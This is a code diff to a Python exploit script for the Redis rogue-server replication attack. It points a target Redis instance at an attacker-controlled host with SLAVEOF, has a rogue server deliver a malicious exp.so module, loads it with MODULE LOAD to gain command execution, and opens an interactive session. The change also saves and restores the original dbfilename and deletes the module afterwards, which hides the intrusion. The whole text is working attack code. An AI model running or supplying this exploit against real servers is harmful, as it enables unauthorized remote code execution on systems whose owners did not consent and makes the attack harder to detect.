@@ -115,21 +115,33 @@ def runserver(rhost, rport, lhost, lport):
     # expolit
     remote = Remote(rhost, rport)
     remote.do(f"SLAVEOF {lhost} {lport}")
-    remote.do("CONFIG SET dbfilename exp.so")
-    path = remote.do("CONFIG GET dir").split(CLRF)[-2]
+
+    # read original config
+    dbfilename = remote.do("CONFIG GET dbfilename").split(CLRF)[-2]
+    dbdir = remote.do("CONFIG GET dir").split(CLRF)[-2]
+
+    # modified to eval config
+    eval_module = "exp.so"
+    eval_dbpath = "{}/{}".format(dbdir, eval_module)
+    remote.do("CONFIG SET dbfilename {}".format(eval_module))
+
+    # rend .so to victim
     sleep(2)
     rogue = RogueServer(lhost, lport)
     rogue.exp()
     sleep(2)
-    remote.do("MODULE LOAD {}/exp.so".format(path))
+
+    # load .so
+    remote.do("MODULE LOAD {}".format(eval_dbpath))
     remote.do("SLAVEOF NO ONE")
 
     # Operations here
     interact(remote)
 
     # clean up
-    remote.do("CONFIG SET dbfilename dump.rdb")
-    remote.shell_cmd("rm {}/exp.so".format(path))
+    # restore original config, delete eval .so
+    remote.do("CONFIG SET dbfilename {}".format(dbfilename))
+    remote.shell_cmd("rm {}".format(eval_dbpath))
     remote.do("MODULE UNLOAD system")
 
 if __name__ == '__main__':
